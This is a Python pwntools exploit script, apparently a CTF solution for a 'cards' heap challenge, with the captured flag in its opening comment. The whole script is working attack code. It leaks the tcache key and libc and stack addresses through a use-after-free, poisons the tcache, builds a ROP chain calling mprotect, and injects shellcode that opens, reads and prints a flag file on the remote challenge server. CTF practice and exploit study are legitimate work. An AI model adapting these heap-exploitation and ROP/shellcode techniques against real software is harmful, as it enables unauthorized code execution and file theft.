#exploit for cards
#Poseidon{7CAch3_I$_5Ti1L_cuT3_@nD_what_about_fastbins:(?->ZmFzdCBiaW4gZGVhZAo=}
from pwn import *
libc=ELF('./libc-2.32.so')
target=remote('poseidonchalls.westeurope.cloudapp.azure.com', 9004)

def add(size,name,color="A"*7):
	target.sendlineafter(": ",str(1))
	target.sendafter(": ",str(size))
	target.sendafter(": ",color)
	target.sendafter(": ",name)

def add2(color="A"*7):
	target.sendlineafter(": ",str(1))
	target.sendafter(": ",str(0))
	target.sendafter(": ",color)
	target.recvuntil("Done.\n")

def delete(index):
	target.sendlineafter(": ",str(2))
	target.sendlineafter(": ",str(index))

def edit(index,name):
	target.sendlineafter(": ",str(3))
	target.sendlineafter(": ",str(index))
	target.sendafter(": ",name)
	
def leak(index):
	target.sendlineafter(": ",str(4))
	target.sendlineafter(": ",str(index))
	leaks=["","",""]
	for i in range(3):
		target.recvuntil(": ")
		leaks[i]=target.recvline().strip(".\n")
	return leaks

def secret(name):
	target.sendlineafter(": ",str(6))
	target.sendafter(": ",name)

payload="A"*0x80+p64(0)+p64(0x111)
add(0x100,payload)#0
add(0x100,"A"*0x100)#1
add(0x100,"A"*0x100)#2
payload="A"*0x60+p64(0)+p64(0xa1)
add(0x100,payload)#3

add2()#4
delete(4)
add2()#5
leaks=leak(5)
key=u64(leaks[2].ljust(8,"\x00"))
delete(0)
delete(1)
payload=p8((0x90^key)%0x100)
edit(1,payload)
add(0x100,"A"*0x100)#6
p=(key*0x1000)+0x2a0
payload=p64(0)+p64(0x421)+"A"*0x60+p64(0)+p64(0x31)+p64(0x100)+p64(4)+p64(p+0x100)
add(0x100,payload)#7
delete(6)
edit(7,"A"*0x11)
leaks=leak(7)
libc_base=u64(leaks[2][16:].ljust(8,"\x00"))-0x3b6c41
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_stackexe=libc_base+0x3cf4a0
libc_stackprot=libc_base+0x5e57b0
libc_env=libc_base+libc.symbols["environ"]
payload="A"*0x90+p64(p+0x320)
edit(7,payload)
edit(6,p64(libc_env))
leaks=leak(2)
stack_leak=u64(leaks[2].ljust(8,"\x00"))
print(hex(stack_leak))
libc_poprdi=libc_base+0x000000000002201c
libc_poprsi=libc_base+0x2c626
libc_poprdx=libc_base+0x0000000000001b9e
libc_mprotect=libc_base+libc.symbols["mprotect"]
libc_poprspr13=libc_base+0x00000000000223e5
shellcode="\x48\xBF"
shellcode+=p64(libc_free_hook-0x30)
shellcode+="\x48\x31\xC0\x48\x31\xF6\x48\x31\xD2\xB0\x02\x0F\x05\x48\x31\xff\x40\x88\xC7\x48\xBE"
shellcode+=p64(libc_free_hook)
shellcode+="\xB2\xFF\x48\x31\xC0\x0F\x05\x40\xB7\x01\xB0\x01\x0F\x05"
payload="A"*0x90+p64(libc_free_hook-0x30)
edit(7,payload)
edit(6,"/home/challenge/flag\x00")
payload="A"*0x90+p64(stack_leak-0x170)
edit(7,payload)
payload=p64(libc_poprdi)
payload+=p64((stack_leak/0x1000)*0x1000)
payload+=p64(libc_poprsi)
payload+=p64(0x1000)
payload+=p64(libc_poprdx)
payload+=p64(0x7)
payload+=p64(libc_mprotect)
payload+=p64(stack_leak-0x130)
payload+=shellcode
edit(6,payload)
target.interactive()


	
		
